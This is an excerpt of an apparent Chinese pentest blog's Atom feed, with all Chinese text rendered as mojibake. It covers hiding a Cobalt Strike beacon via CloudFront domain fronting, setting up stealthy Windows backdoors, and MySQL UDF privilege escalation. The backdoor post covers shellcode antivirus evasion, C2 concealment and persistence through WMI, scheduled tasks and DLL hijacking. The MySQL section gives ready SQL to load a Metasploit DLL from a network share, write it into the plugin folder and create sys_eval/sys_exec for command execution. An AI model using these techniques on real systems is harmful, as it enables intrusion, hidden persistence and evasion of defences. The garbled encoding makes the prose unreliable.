    <summary type="html">&lt;p&gt;è®°å½•ä¸€ä¸‹å½“ä½¿ç”¨&lt;code&gt;Domain Fronting&lt;/code&gt;ä¸­ä½¿ç”¨&lt;code&gt;https&lt;/code&gt;æ¥ä¸Šçº¿æ—¶å€™çš„å‘ï¼Œå› ä¸ºæŸ¥äº†åŠåœˆæ²¡æœ‰æ‰¾åˆ°ç±»ä¼¼çš„èµ„æ–™ï¼Œä¸ºå•¥éè¦httpså‘¢ï¼Œå› ä¸º&lt;code&gt;node32&lt;/code&gt;å¯¹httpçš„æµé‡å¾ˆæ•æ„Ÿã€‚&lt;/p&gt;
&lt;p&gt;###ç›®æ ‡&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä½¿ç”¨&lt;code&gt;Windows/beacon_https/reverse_https&lt;/code&gt;ä½œä¸ºä¸Šçº¿çš„payload&lt;/li&gt;
&lt;li&gt;AWSçš„&lt;code&gt;Cloudfront&lt;/code&gt;ä½œä¸ºå‰ç½®åŸŸå&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;å‡†å¤‡å·¥ä½œ&quot;&gt;&lt;a href=&quot;#å‡†å¤‡å·¥ä½œ&quot; class=&quot;headerlink&quot; title=&quot;å‡†å¤‡å·¥ä½œ&quot;&gt;&lt;/a&gt;å‡†å¤‡å·¥ä½œ&lt;/h2&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;åŸŸå: example.com
VPS(Centos)
cloudflare(åªä½œåŸŸåè§£æ,ä¸æ·»åŠ ä»»ä½•å…¶ä»–åŠŸèƒ½ï¼Œä¸åŠ CDNï¼Œä¸åŠ HTTPS)&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;h2 id=&quot;éƒ¨ç½²å·¥ä½œ&quot;&gt;&lt;a href=&quot;#éƒ¨ç½²å·¥ä½œ&quot; class=&quot;headerlink&quot; title=&quot;éƒ¨ç½²å·¥ä½œ&quot;&gt;&lt;/a&gt;éƒ¨ç½²å·¥ä½œ&lt;/h2&gt;&lt;p&gt;å®‰è£…çš„apacheæ˜¯æµ‹è¯•è¿é€šæ€§ï¼Œé™¤æ­¤ä¹‹å¤–æ²¡æœ‰ä»»ä½•ç”¨å¤„ã€‚&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;yum install httpd
systemctl start httpd&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;å¢åŠ apacheé…ç½®æ–‡ä»¶&quot;&gt;&lt;a href=&quot;#å¢åŠ apacheé…ç½®æ–‡ä»¶&quot; class=&quot;headerlink&quot; title=&quot;å¢åŠ apacheé…ç½®æ–‡ä»¶&quot;&gt;&lt;/a&gt;å¢åŠ apacheé…ç½®æ–‡ä»¶&lt;/h4&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;#&amp;#x2F;etc&amp;#x2F;httpd&amp;#x2F;conf.d&amp;#x2F;vhost.conf
&amp;lt;VirtualHost *:80&amp;gt;
   DocumentRoot &amp;#x2F;var&amp;#x2F;www&amp;#x2F;html
   ServerName example.com


RewriteEngine on
RewriteCond %&amp;#123;SERVER_NAME&amp;#125; &amp;#x3D;example.com
RewriteRule ^ https:&amp;#x2F;&amp;#x2F;%&amp;#123;SERVER_NAME&amp;#125;%&amp;#123;REQUEST_URI&amp;#125; [END,NE,R&amp;#x3D;permanent]
&amp;lt;&amp;#x2F;VirtualHost&amp;gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Windowsåé—¨éšè—</title>
    <link href="https://jkme.github.io/2020/08/28/hide-your-windows-backdoor.html"/>
    <id>https://jkme.github.io/2020/08/28/hide-your-windows-backdoor.html</id>
    <published>2020-08-27T16:00:00.000Z</published>
    <updated>2022-01-21T02:26:43.177Z</updated>
    
    <content type="html"><![CDATA[<h3 id="åé—¨çš„æ„æˆ"><a href="#åé—¨çš„æ„æˆ" class="headerlink" title="åé—¨çš„æ„æˆ"></a>åé—¨çš„æ„æˆ</h3><p>åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†:</p><ol><li>shellcodeçš„åˆ†ç¦»å…æ€</li><li>C2æœåŠ¡å™¨çš„éšè—</li><li>Windowsåé—¨çš„è®¾ç½®</li></ol><h3 id="åˆ†ç¦»å…æ€"><a href="#åˆ†ç¦»å…æ€" class="headerlink" title="åˆ†ç¦»å…æ€"></a>åˆ†ç¦»å…æ€</h3><p>shellcodeçš„åˆ†ç¦»å…æ€æœ‰å¾ˆå¤šç§ï¼Œè¿™é‡ŒæŠŠæ¯ä¸ªæ¨¡å—æ‹¿å‡ºæ¥å°±æ˜¯å¦‚ä¸‹çš„å‡ ä¸ª:</p><ol><li>é€šä¿¡: <code>socket</code>,<code>http</code></li><li><code>shellcode</code>çš„æ‰§è¡Œæ–¹å¼</li><li><code>shellcode</code>çš„æµé‡</li><li>è¿œç¨‹æœåŠ¡å™¨çš„éšè—</li></ol><p>é™¤å»ç¬¬äºŒç§æ–¹å¼æœ‰å¾ˆå¤šç§å¯ä»¥æ‰§è¡Œshellcodeçš„ï¼Œå…¶ä»–ä¸‰ç§æœ€å¥½çš„è§£å†³æ–¹æ¡ˆæ˜¯å®ç”¨<code>Domain Fronting</code>éšè—æœåŠ¡å™¨ï¼ŒAESåŠ¨æ€åŠ å¯†è§£å¯†è¿è¡Œshellcodeã€‚è¿™æ ·å­æ—¢éšè—äº†æœåŠ¡å™¨ï¼Œåˆé¿å…shellcodeçš„æ˜æ–‡æµé‡è¢«æ¢æµ‹åˆ°ã€‚å½“ç„¶ä¸Šçº¿ä¹‹åçš„æ“ä½œè¢«æ¢æµ‹ä¸åœ¨è¢«è®¨è®ºçš„èŒƒå›´ä¹‹å†…ã€‚</p><p>åœ¨å‚è€ƒèµ„æ–™é‡Œé¢,<code>uknownsec</code>å·²ç»æŠŠä¸»è¦çš„ä»£ç æ”¾å‡ºæ¥äº†ã€‚åªéœ€è¦æ‹¿å‡ºæ¥æ‹¼å‡‘ä¸€ä¸‹å°±å¯ä»¥é£Ÿç”¨ã€‚</p><p>å…¶ä¸­æœåŠ¡ç«¯å‡ºå»pythonçš„åŠŸèƒ½ä¹‹å¤–ï¼Œå¯ä»¥ç»™è‡ªå·±åŠ ä¸Šä¸€ä¸ª<code>slack</code>æœºå™¨äººçš„é€šçŸ¥ï¼Œè¿™æ ·å­ä¸Šçº¿çš„æ—¶å€™å°±æœ‰é€šçŸ¥ã€‚</p><h4 id="C2æœåŠ¡å™¨çš„éšè—"><a href="#C2æœåŠ¡å™¨çš„éšè—" class="headerlink" title="C2æœåŠ¡å™¨çš„éšè—"></a>C2æœåŠ¡å™¨çš„éšè—</h4><p>è§ä¸Šä¸€ç¯‡çš„<code>Domain Fronting</code>éšè—HTTPSã€‚</p><p>è¿™ä¸ªC2çš„éšè—å¦‚æœæ›´å®Œç¾ä¸€ç‚¹çš„è¯ï¼Œå¯ä»¥åŠ ä¸Šredirectorã€‚ä½†æ˜¯æˆ‘æƒ³äº†ä¸€ä¸‹ï¼Œå¼€å¯CSçš„æ—¶é—´å°±æ˜¯æ§åˆ¶åˆ©ç”¨çš„é‚£ä¸€å°æ®µï¼Œè¿™é‡Œå°±ä¸æŠ˜è…¾äº†ã€‚</p><h4 id="Windowsåé—¨çš„è®¾ç½®"><a href="#Windowsåé—¨çš„è®¾ç½®" class="headerlink" title="Windowsåé—¨çš„è®¾ç½®"></a>Windowsåé—¨çš„è®¾ç½®</h4><p>é™¤å»æœ€å¸¸è§çš„è®¡åˆ’ä»»åŠ¡ï¼Œå‰©ä¸‹çš„æ˜¯ä¸€å †æ³¨å†Œè¡¨ï¼Œå¦‚æœå­˜åœ¨360ä¹‹ç±»çš„è¯ï¼Œæ˜¯æ¯”è¾ƒéš¾å¤„ç†çš„ã€‚å…¶ä¸­æœ‰ä¸€ä¸ª<code>WMI</code>ï¼Œå¾ˆå¥‡æ€ªå„ä¸ªæ€è½¯çš„æ‹¦æˆªéƒ½ä¸æ˜¯å¤ªç§¯æã€‚</p><p>åœ¨å®é™…æµ‹è¯•ä¸­ï¼Œå¦‚æœç•™çš„åé—¨æ˜¯æœåŠ¡å™¨ï¼Œé‚£ä¹ˆåé—¨å¿…é¡»æ˜¯å®šæ—¶å¯åŠ¨ï¼Œå¦‚æœæ˜¯ä¸ªäººç”µè„‘ï¼Œé‚£ä¹ˆæ˜¯åœ¨ç‰¹å®šçš„æ—¶é—´å†…å¯åŠ¨ã€‚æ³¨æ„è¿™ä¸ªæ—¶é—´ç‚¹çš„è®¾ç½®ã€‚</p><p>åœ¨Windowsä¸Šé¢ï¼Œæœ€åç•™ä¸‹2ä¸ªä»¥ä¸Šçš„åé—¨ã€‚ä¸€ä¸ªexeï¼Œä¸€ä¸ªdllåŠ«æŒï¼ŒdllåŠ«æŒæˆ‘åœ¨githubä¸Šé¢æ”¾äº†ä¸¤ä¸ªæ–¹å¼ï¼Œæ¨èä½¿ç”¨spoolerï¼Œå› ä¸ºå®ƒé»˜è®¤æƒé™æœ€é«˜ï¼Œæ¯ä¸ªç”µè„‘éƒ½æ˜¯å¼€æœºå¯åŠ¨ã€‚</p><h3 id="åé—¨çš„å½¢å¼"><a href="#åé—¨çš„å½¢å¼" class="headerlink" title="åé—¨çš„å½¢å¼"></a>åé—¨çš„å½¢å¼</h3><h4 id="Windowsçš„Systemæƒé™"><a href="#Windowsçš„Systemæƒé™" class="headerlink" title="Windowsçš„Systemæƒé™"></a>Windowsçš„Systemæƒé™</h4><ul><li>wmiå¼€æœºå¯åŠ¨å’Œå®šæ—¶å¯åŠ¨</li><li>è®¡åˆ’ä»»åŠ¡</li><li>spoolerçš„DllåŠ«æŒ</li></ul><h4 id="Windowsçš„Useræƒé™"><a href="#Windowsçš„Useræƒé™" class="headerlink" title="Windowsçš„Useræƒé™"></a>Windowsçš„Useræƒé™</h4><ul><li>msdtcçš„dllåŠ«æŒ</li></ul><h4 id="Windowsçš„Networkæƒé™"><a href="#Windowsçš„Networkæƒé™" class="headerlink" title="Windowsçš„Networkæƒé™"></a>Windowsçš„Networkæƒé™</h4><ul><li>Redisçš„DllåŠ«æŒ</li></ul><h4 id="äº‘æŸ¥æ€çš„ç»•è¿‡"><a href="#äº‘æŸ¥æ€çš„ç»•è¿‡" class="headerlink" title="äº‘æŸ¥æ€çš„ç»•è¿‡"></a>äº‘æŸ¥æ€çš„ç»•è¿‡</h4><p>ä¹‹å‰åœ¨æµ‹è¯•<code>Windows Defender</code>çš„æ—¶å€™ï¼Œæœ¬æ¥æ˜¯å…æ€çš„exeï¼Œè·‘ä¸¤ä¸‰æ¬¡ä¹‹åå°±è¢«æ€äº†ã€‚ç™¾æ€ä¸å¾—å…¶è§£ï¼Œåæ¥å‘ç°æ˜¯äº‘ä¸Šä¼ ä¹‹åè¢«æŸ¥æ€äº†ï¼Œè§‚å¯Ÿä¸€ä¸‹ä¸Šçº¿äº‘æŸ¥æ€çš„æœºå™¨ï¼Œå¯ä»¥å¾ˆå®¹æ˜“çš„ç»•è¿‡ã€‚</p><p>å†å¾€åä¸€ç‚¹ï¼Œè€ƒè™‘ä¸€ä¸‹å¦‚æœæ¯ä¸ªæœºå™¨ä¸Šçº¿éƒ½æ˜¯ä½ åŠ¨æ‰‹æ¥åšçš„è¯ï¼Œé‚£ä¹ˆå¯ä»¥è€ƒè™‘å†™ä¸€ä¸ªç¨‹åºï¼Œä¸ºæ¯ä¸€ä¸ªè¢«æ”¾åé—¨çš„ç”µè„‘ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„hashå€¼ï¼Œè¿™ä¸ªhashå€¼å­˜æ”¾åœ¨shellcodeåŠ è½½æœåŠ¡å™¨ä¸Šé¢ï¼Œshellcodeæ‰§è¡Œä¹‹å‰å…ˆæ£€æŸ¥æ˜¯å¦åœ¨æ•°æ®åº“é‡Œé¢ï¼Œè¿™æ ·æ˜¯ä¸æ˜¯æ›´å®Œç¾çš„æ–¹å¼?</p><h3 id="åé—¨çš„è¿›é˜¶"><a href="#åé—¨çš„è¿›é˜¶" class="headerlink" title="åé—¨çš„è¿›é˜¶"></a>åé—¨çš„è¿›é˜¶</h3><ul><li><code>AES</code>åŠ¨æ€åŠ è§£å¯†</li><li><code>Domain Fronting</code>éšè—å­˜æ”¾<code>shellcode</code> </li><li><code>Domain Fronting</code>éšè—<code>C2</code> </li><li><code>shellcode</code>å…æ€çš„æ‰§è¡Œæ–¹å¼</li></ul><p>å‚è€ƒèµ„æ–™:</p><ul><li><a href="https://uknowsec.cn/posts/notes/ShellCode%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">https://uknowsec.cn/posts/notes/ShellCode%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;åé—¨çš„æ„æˆ&quot;&gt;&lt;a href=&quot;#åé—¨çš„æ„æˆ&quot; class=&quot;headerlink&quot; title=&quot;åé—¨çš„æ„æˆ&quot;&gt;&lt;/a&gt;åé—¨çš„æ„æˆ&lt;/h3&gt;&lt;p&gt;åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;shellcodeçš„åˆ†ç¦»å…æ€&lt;/li&gt;
&lt;li&gt;C2æœåŠ¡å™¨çš„éšè—&lt;/li&gt;
&lt;li&gt;Windowsåé—¨çš„è®¾ç½®&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;åˆ†ç¦»å…æ€&quot;&gt;&lt;a href=&quot;#åˆ†ç¦»å…æ€&quot; class=&quot;headerlink&quot; title=&quot;åˆ†ç¦»å…æ€&quot;&gt;&lt;/a&gt;åˆ†ç¦»å…æ€&lt;/h3&gt;&lt;p&gt;shellcodeçš„åˆ†ç¦»å…æ€æœ‰å¾ˆå¤šç§ï¼Œè¿™é‡ŒæŠŠæ¯ä¸ªæ¨¡å—æ‹¿å‡ºæ¥å°±æ˜¯å¦‚ä¸‹çš„å‡ ä¸ª:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;é€šä¿¡: &lt;code&gt;socket&lt;/code&gt;,&lt;code&gt;http&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shellcode&lt;/code&gt;çš„æ‰§è¡Œæ–¹å¼&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shellcode&lt;/code&gt;çš„æµé‡&lt;/li&gt;
&lt;li&gt;è¿œç¨‹æœåŠ¡å™¨çš„éšè—&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;é™¤å»ç¬¬äºŒç§æ–¹å¼æœ‰å¾ˆå¤šç§å¯ä»¥æ‰§è¡Œshellcodeçš„ï¼Œå…¶ä»–ä¸‰ç§æœ€å¥½çš„è§£å†³æ–¹æ¡ˆæ˜¯å®ç”¨&lt;code&gt;Domain Fronting&lt;/code&gt;éšè—æœåŠ¡å™¨ï¼ŒAESåŠ¨æ€åŠ å¯†è§£å¯†è¿è¡Œshellcodeã€‚è¿™æ ·å­æ—¢éšè—äº†æœåŠ¡å™¨ï¼Œåˆé¿å…shellcodeçš„æ˜æ–‡æµé‡è¢«æ¢æµ‹åˆ°ã€‚å½“ç„¶ä¸Šçº¿ä¹‹åçš„æ“ä½œè¢«æ¢æµ‹ä¸åœ¨è¢«è®¨è®ºçš„èŒƒå›´ä¹‹å†…ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨å‚è€ƒèµ„æ–™é‡Œé¢,&lt;code&gt;uknownsec&lt;/code&gt;å·²ç»æŠŠä¸»è¦çš„ä»£ç æ”¾å‡ºæ¥äº†ã€‚åªéœ€è¦æ‹¿å‡ºæ¥æ‹¼å‡‘ä¸€ä¸‹å°±å¯ä»¥é£Ÿç”¨ã€‚&lt;/p&gt;
&lt;p&gt;å…¶ä¸­æœåŠ¡ç«¯å‡ºå»pythonçš„åŠŸèƒ½ä¹‹å¤–ï¼Œå¯ä»¥ç»™è‡ªå·±åŠ ä¸Šä¸€ä¸ª&lt;code&gt;slack&lt;/code&gt;æœºå™¨äººçš„é€šçŸ¥ï¼Œè¿™æ ·å­ä¸Šçº¿çš„æ—¶å€™å°±æœ‰é€šçŸ¥ã€‚&lt;/p&gt;
&lt;h4 id=&quot;C2æœåŠ¡å™¨çš„éšè—&quot;&gt;&lt;a href=&quot;#C2æœåŠ¡å™¨çš„éšè—&quot; class=&quot;headerlink&quot; title=&quot;C2æœåŠ¡å™¨çš„éšè—&quot;&gt;&lt;/a&gt;C2æœåŠ¡å™¨çš„éšè—&lt;/h4&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>MySql UDFææƒæ³¨æ„äº‹é¡¹</title>
    <link href="https://jkme.github.io/2020/07/29/mysql-UDF.html"/>
    <id>https://jkme.github.io/2020/07/29/mysql-UDF.html</id>
    <published>2020-07-28T16:00:00.000Z</published>
    <updated>2022-01-21T01:42:01.931Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>[mysql-udf-exploitation]<a href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSFçš„dll: <a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p></blockquote><h3 id="0x01-å‡†å¤‡å·¥ä½œ"><a href="#0x01-å‡†å¤‡å·¥ä½œ" class="headerlink" title="0x01 å‡†å¤‡å·¥ä½œ"></a>0x01 å‡†å¤‡å·¥ä½œ</h3><p>å…ˆæ£€æŸ¥è¿è¡Œçš„mysqlç»“æ„:</p><pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç»“æœå¦‚ä¸‹:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>+----------------------+---------------------------+<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>+----------------------+---------------------------+<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>+----------------------+---------------------------+MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>+-------------------------+--------+<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>+-------------------------+--------+<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span><span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>+-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨<code>Mysql 5.0.67</code>ç‰ˆæœ¬å¼€å§‹ï¼ŒUDFçš„æ–‡ä»¶å¿…é¡»æ”¾åœ¨mysqlçš„æ’ä»¶ç›®å½•: <code>select @@plugin_dir;</code></p><p>å¯ä»¥åœ¨å¼€å¯mysqlçš„æ—¶å€™è®¾ç½®pluginçš„ç›®å½•:</p><pre class="line-numbers language-none"><code class="language-none">æŒ‡å®šç›®å½•:mysqld.exe â€“plugin-dir&#x3D;C:\\temp\\plugins\\æŒ‡å®šé…ç½®æ–‡ä»¶:mysqld.exe --defaults-file&#x3D;C:\\temp\\my.inié…ç½®æ–‡ä»¶åŒ…æ‹¬å¦‚ä¸‹å†…å®¹:[mysqld]plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€ç‰ˆæœ¬çš„Mysqlæœç´¢UDFè·¯å¾„æ˜¯æŒ‰ç…§å¦‚ä¸‹çš„é¡ºåºæ¥çš„:</p><ul><li>@@datadir</li><li>@@basedir\bin</li><li>C:\windows</li><li>C:\windows\system</li><li>C:\windows\system32</li></ul><h3 id="ä¸Šä¼ UDFçš„æ–‡ä»¶"><a href="#ä¸Šä¼ UDFçš„æ–‡ä»¶" class="headerlink" title="ä¸Šä¼ UDFçš„æ–‡ä»¶"></a>ä¸Šä¼ UDFçš„æ–‡ä»¶</h3><h4 id="0x01-ç½‘ç»œå…±äº«å†™æ–‡ä»¶"><a href="#0x01-ç½‘ç»œå…±äº«å†™æ–‡ä»¶" class="headerlink" title="0x01 ç½‘ç»œå…±äº«å†™æ–‡ä»¶"></a>0x01 ç½‘ç»œå…±äº«å†™æ–‡ä»¶</h4><pre class="line-numbers language-none"><code class="language-none">select load_file(&#39;\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll&#39;) into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="0x02-åå…­è¿›åˆ¶"><a href="#0x02-åå…­è¿›åˆ¶" class="headerlink" title="0x02 åå…­è¿›åˆ¶"></a>0x02 åå…­è¿›åˆ¶</h4><pre class="line-numbers language-none"><code class="language-none">xxd -plain &#x2F;tmp&#x2F;udf.dll | tr -d &#39;\n&#39; &gt; &#x2F;tmp&#x2F;dll.hex è½¬æ¢ä¸º16è¿›åˆ¶use mysql;set @a&#x3D;concat(&#39;&#39;, 0x&lt;hex_of_exe&gt;);create table tmp(data LONGBLOB);insert into tmp values(&quot;&quot;);update tmp set data &#x3D; @a;select data from tmp into DUMPFILE &lt;dir&gt;;create function sys_eval returns string soname &#39;sys_eval.dll&#39;;drop table tmp;drop function sys_eval; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="0x03-ç½‘ç»œå…±äº«-16è¿›åˆ¶"><a href="#0x03-ç½‘ç»œå…±äº«-16è¿›åˆ¶" class="headerlink" title="0x03 ç½‘ç»œå…±äº«+16è¿›åˆ¶"></a>0x03 ç½‘ç»œå…±äº«+16è¿›åˆ¶</h4><pre class="line-numbers language-none"><code class="language-none">load data infile &#39;\\\\192.168.0.19\\network\\udf.hex&#39; into table temp fields terminated by &#39;@OsandaMalith&#39; lines terminated by &#39;@OsandaMalith&#39; (data);select unhex(data) from temp into dumpfile &#39;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="0x04-base64å†™å…¥"><a href="#0x04-base64å†™å…¥" class="headerlink" title="0x04 base64å†™å…¥"></a>0x04 base64å†™å…¥</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;å…ˆè½¬æ¢ä¸ºbase64;select to_base64(load_file(&#39;&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.dll&#39;)) into dumpfile &#39;&#x2F;tmp&#x2F;udf.b64&#39;;&#x2F;&#x2F;å†å†™å…¥:select from_base64(&quot;TVqQAAMAAAAEAAAAA&quot;) into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;æˆ–è€…å†™å…¥åˆ°å¤§è¡¨é‡Œé¢ï¼Œå†å†™å…¥åˆ°æ–‡ä»¶:select from_base64(data) from temp into dumpfile &#39;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>msfè‡ªå¸¦çš„udfæä¾›çš„å‡ ä¸ªå‡½æ•°ï¼Œä¸»è¦ç”¨åˆ°çš„æ˜¯<code>sys_eval</code>å’Œ<code>sys_exec</code>,å®æµ‹<code>sys_exec</code>ä¼šæŠŠmysqlå´©æºƒï¼Œå¯èƒ½åˆ›å»ºçš„æ—¶å€™è¿”å›äº†stringï¼Œå»ºè®®ä½¿ç”¨<code>sys_eval</code>:</p><h4 id="sys-exec"><a href="#sys-exec" class="headerlink" title="sys_exec"></a>sys_exec</h4><pre class="line-numbers language-none"><code class="language-none">åˆ›å»ºå‡½æ•°:create function sys_exec returns int soname &#39;udf.dll&#39;;ç¡®å®šæ˜¯å¦æˆåŠŸ:select * from mysql.func where name &#x3D; &#39;sys_exec&#39;;åˆ é™¤å‡½æ•°:drop function sys_exec;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sys-eval"><a href="#sys-eval" class="headerlink" title="sys_eval"></a>sys_eval</h4><pre class="line-numbers language-none"><code class="language-none">åˆ›å»ºå‡½æ•°:create function sys_eval returns string soname &#39;udf.dll&#39;;ç¡®å®šæ˜¯å¦æˆåŠŸ:select * from mysql.func where name &#x3D; &#39;sys_eval&#39;;åˆ é™¤:drop function sys_eval;ä½¿ç”¨:select sys_eval(&#39;dir&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sys-get"><a href="#sys-get" class="headerlink" title="sys_get"></a>sys_get</h4><pre class="line-numbers language-none"><code class="language-none">create function sys_get returns string soname &#39;udf.dll&#39;;Drop function sys_get;&#x2F;&#x2F;è·å–ç¯å¢ƒå˜é‡Select sys_get(&#39;longonserver&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>I noticed that these external UDF functions do not have proper exception handling in the dissembled code. Hence, a slightest mistake while calling these functions will lead the mysqld.exe server to crash. I hope this article might be useful to you while pentesting MySQL.</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;[mysql-udf-exploitation]&lt;a href=&quot;https://osandamalith.com/2018/02/11/mysql-udf-exploitation&quot;&gt;https://osandamalith.com/2018/02/11/mysql-udf-exploitation&lt;/a&gt;&lt;br&gt;MSFçš„dll: &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql&quot;&gt;https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x01-å‡†å¤‡å·¥ä½œ&quot;&gt;&lt;a href=&quot;#0x01-å‡†å¤‡å·¥ä½œ&quot; class=&quot;headerlink&quot; title=&quot;0x01 å‡†å¤‡å·¥ä½œ&quot;&gt;&lt;/a&gt;0x01 å‡†å¤‡å·¥ä½œ&lt;/h3&gt;&lt;p&gt;å…ˆæ£€æŸ¥è¿è¡Œçš„mysqlç»“æ„:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;select @@version_compile_os, @@version_compile_machine;
show variables like &amp;#39;%compile%&amp;#39;;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç»“æœå¦‚ä¸‹:&lt;/p&gt;
